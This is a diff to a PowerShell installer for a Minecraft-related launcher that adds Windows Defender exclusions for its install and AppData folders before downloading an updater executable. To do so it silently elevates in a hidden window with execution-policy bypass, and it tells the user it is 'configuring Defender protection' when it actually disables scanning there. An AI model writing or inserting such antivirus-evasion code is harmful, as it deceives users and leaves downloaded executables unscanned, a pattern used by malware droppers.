@@ -21,6 +21,33 @@ if (-not (Test-Path -LiteralPath $TargetDir)) {
     New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
 }
 
+# 1.1 Configurar exclusion de Windows Defender para evitar falsos positivos
+try {
+    $localCoco = [IO.Path]::GetFullPath($TargetDir).TrimEnd('\')
+    $appDataCoco = [IO.Path]::GetFullPath((Join-Path $env:APPDATA 'CocoMinecraft')).TrimEnd('\')
+    $needExclusion = $true
+    $getPref = Get-Command Get-MpPreference -ErrorAction SilentlyContinue
+    if ($getPref) {
+        try {
+            $existing = @((Get-MpPreference -ErrorAction Stop).ExclusionPath | Where-Object { $_ } | ForEach-Object { [IO.Path]::GetFullPath([string]$_).TrimEnd('\') })
+            if ($existing -contains $localCoco -and $existing -contains $appDataCoco) { $needExclusion = $false }
+        } catch {}
+    }
+    if ($needExclusion) {
+        $principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+        if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            Add-MpPreference -ExclusionPath $localCoco, $appDataCoco -ErrorAction SilentlyContinue
+        } else {
+            Write-Host "Configurando proteccion de Windows Defender (pulsa 'Si' en el aviso de Windows)..." -ForegroundColor Cyan
+            $cmd = "Add-MpPreference -ExclusionPath '$localCoco','$appDataCoco' -ErrorAction SilentlyContinue"
+            $elevated = Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-Command',$cmd) -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+            if ($elevated) {
+                $elevated.WaitForExit(15000) | Out-Null
+            }
+        }
+    }
+} catch {}
+
 $targetExe = Join-Path $TargetDir 'CocoUpdater.exe'
 
 # 2. Descargar la ultima version de CocoUpdater.exe
